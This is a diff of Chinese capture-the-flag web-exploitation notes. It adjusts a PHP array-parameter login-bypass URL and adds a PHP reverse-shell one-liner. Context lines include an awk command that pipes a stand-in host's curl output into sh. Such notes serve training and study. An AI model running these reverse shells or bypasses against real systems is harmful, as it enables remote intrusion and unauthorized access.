@@ -1014,7 +1014,7 @@ $('#ajax-load').load('/ajax/articles?cat=news');
 ?>
 ```
 
-可用`https://xxx.com/?username=aaa&password[0]=bbb`绕过。一般情况直接传数组就行，有的时候需要数组里赋值。
+可用`https://xxx.com/?username=a&password[0]=b`绕过。一般情况直接传数组就行，有的时候需要数组里赋值。也可用`https://xxx.com/username=aaa&password[]=[]`
 
 - php[序列化字符串](https://www.neatstudio.com/show-161-1.shtml)利用引用符号R绕过`secret1 === secret2`。
 165. [Christmas Heist](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/ChristmasHeist/writeup.md)
@@ -1135,3 +1135,4 @@ function check($str){
 179. 假设只能使用长度为3个字符以内的命令，但参数不限制，就可以用[awk](https://wangchujiang.com/linux-command/c/awk.html)命令反弹shell。`awk '{system("curl https://your-shell.com/ip:port|sh")}'`
 180. php也有整型溢出。例题:[茶歇区](https://blog.csdn.net/miuzzx/article/details/127830557#t16)
 181. AES的ECB模式下，一组密文对应一组明文，也就是说，可以通过改变密文的顺序从而改变解密后明文的顺序。甚至说，可以自己移除某一段密文，只要解密后的明文有效就行。例题:[龙珠NFT](https://ctf-show.feishu.cn/docx/UpC6dtDqgo7VuoxXlcvcLwzKnqh)
+182. php环境下的反弹shell（reverse shell）命令。`php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh <&3 >&3 2>&3");'`.
